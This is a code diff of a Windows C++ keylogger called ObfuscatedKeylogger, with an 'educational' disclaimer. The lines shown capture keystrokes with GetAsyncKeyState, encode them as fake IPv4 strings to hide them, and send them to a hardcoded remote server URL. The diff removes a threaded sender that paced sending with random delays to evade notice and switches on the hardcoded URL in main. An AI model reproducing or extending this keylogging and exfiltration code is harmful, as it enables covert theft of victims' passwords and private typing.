@@ -1,3 +1,15 @@
+/*
+ * ObfuscatedKeylogger.cpp
+ * Author: Alex Zevnoski (Leshenka)
+ * Copyright (c) 2024 Alex Zevnoski (Leshenka)
+ *
+ * This file is part of the ObfuscatedKeylogger project, an educational
+ * and experimental project demonstrating obfuscation and data transmission techniques.
+ *
+ * DISCLAIMER: This software is intended solely for educational purposes.
+ * The author does not condone or support illegal or unethical use of this software.
+ */
+
 #include "Transmission.h"
 #include <windows.h>
 #include "Keylogger.h"
@@ -6,75 +18,10 @@
 #include <time.h>
 #include <queue>
 
-
-std::queue<char*> keystrokeQueue;
-CRITICAL_SECTION queueLock;
-
 // Array to track the state of keys
 #define KEY_COUNT 256
 BYTE keyStates[KEY_COUNT];
 
-// Use the server URL provided by CMake
-const char* serverUrl = SERVER_URL;
-
-
-void enqueueKeystroke(const char* obfuscatedKeystroke) {
-    EnterCriticalSection(&queueLock);
-    char* keystroke = _strdup(obfuscatedKeystroke); // Duplicate string to avoid overwriting
-    keystrokeQueue.push(keystroke);
-    LeaveCriticalSection(&queueLock);
-}
-
-void sendKeystrokesFromQueue(const char* serverUrl) {
-    EnterCriticalSection(&queueLock);
-    int batchSize = 5; // Number of keystrokes to send in one batch
-
-    while (!keystrokeQueue.empty() && batchSize > 0) {
-        char* keystroke = keystrokeQueue.front(); // Get the oldest keystroke
-        keystrokeQueue.pop(); // Remove the firstly registered keystroke 
-
-        // Send the keystrok to the server
-        if (!sendIpv4ToServer(serverUrl, keystroke)) {
-            fprintf(stderr, "Failed to send keystroke: %s\n", keystroke);
-        }
-        else {
-            printf("Keystroke sent: %s\n", keystroke);
-        }
-
-        free(keystroke);
-        batchSize--;
-    }
-    DeleteCriticalSection(&queueLock);
-}
-
-void sendKeystrokesIndividuallyWithRandomDelay(const char* serverUrl) {
-    EnterCriticalSection(&queueLock);
-
-    while (!keystrokeQueue.empty()) {
-        char* keystroke = keystrokeQueue.front();  // Get the oldest keystroke
-        keystrokeQueue.pop();  // Remove it from the queue
-
-        LeaveCriticalSection(&queueLock);  // Unlock before sending to avoid blocking other threads
-
-        // Send the keystroke to the server
-        if (!sendIpv4ToServer(serverUrl, keystroke)) {
-            fprintf(stderr, "Failed to send keystroke: %s\n", keystroke);
-        }
-        else {
-            printf("Keystroke sent: %s\n", keystroke);
-        }
-
-        free(keystroke);  // Free the memory allocated for the keystroke
-
-        // Generate a random delay between 5 and 10 seconds
-        int randomDelay = 5 + (rand() % 6);  // rand() % 6 gives a range [0, 5]
-        Sleep(randomDelay * 1000);  // Convert seconds to milliseconds
-
-        EnterCriticalSection(&queueLock);  // Re-lock to continue processing
-    }
-
-    LeaveCriticalSection(&queueLock);
-}
 
 // Function to periodically send and clear keystrokes
 void sendKeystrokesPeriodically(MemoryRegion* memRegion, const char* serverUrl) {
@@ -96,67 +43,6 @@ void sendKeystrokesPeriodically(MemoryRegion* memRegion, const char* serverUrl) 
     memset(memRegion->baseAddress, 0, memRegion->size);
 }
 
-DWORD WINAPI keystrokeSenderThread(LPVOID param) {
-    const char* serverUrl = (const char*)param;
-    while (true) {
-        // Check and send keystrokes one at a time
-        sendKeystrokesIndividuallyWithRandomDelay(serverUrl);
-
-        // Sleep for a while if there are no keystrokes to process
-        Sleep(5000);
-    }
-
-    return 0;
-}
-
-void mainToUseThreadForSendingKeystrokesIndividuallyWithRandomDelay() {
-    InitializeCriticalSection(&queueLock);
-
-   // const char* serverUrl = "http://192.168.2.181:6969/receive_ip";  // Change this later
-
-    // Create the sender thread
-    HANDLE senderThread = CreateThread(NULL, 0, keystrokeSenderThread, (LPVOID)serverUrl, 0, NULL);
-
-    MemoryRegion memRegion;
-    memRegion.baseAddress = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 100);
-    memRegion.size = 100;
-    memRegion.used = 0;
-
-    if (memRegion.baseAddress == NULL) {
-        perror("Failed to allocate memory");
-       // return 1;
-    }
-
-    char i;
-    while (true) {
-        for (i = 8; i <= 255; i++) {
-            if (GetAsyncKeyState(i) == -32767) {
-                logKey(i, &memRegion);  // Log the keystroke locally
-
-                char* obfuscated = GenerateIpv4(memRegion.baseAddress[0], memRegion.baseAddress[1],
-                    memRegion.baseAddress[2], memRegion.baseAddress[3]);
-
-                enqueueKeystroke(obfuscated);
-                free(obfuscated);  // Free memory from `GenerateIpv4`
-
-                // Reset the memory region for the next keystroke
-                memRegion.used = 0;
-                memset(memRegion.baseAddress, 0, memRegion.size);
-
-                break;  // Break to the next key event
-            }
-        }
-    }
-
-    // Clean up resources (unlikely to reach here in this design)
-    CloseHandle(senderThread);
-    HeapFree(GetProcessHeap(), 0, memRegion.baseAddress);
-    DeleteCriticalSection(&queueLock);
-
-    //return 0;
-}
-
-
 int main() {
     MemoryRegion memRegion;
     memRegion.baseAddress = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 100);
@@ -168,7 +54,7 @@ int main() {
         return 1;
     }
 
-  //  const char* serverUrl = "http://192.168.2.181:6969/receive_ip";  // Change as needed
+  const char* serverUrl = "http://192.168.2.181:6969/receive_ip";  // Change as needed
 
     // Initialize keyStates array
     memset(keyStates, 0, sizeof(keyStates));
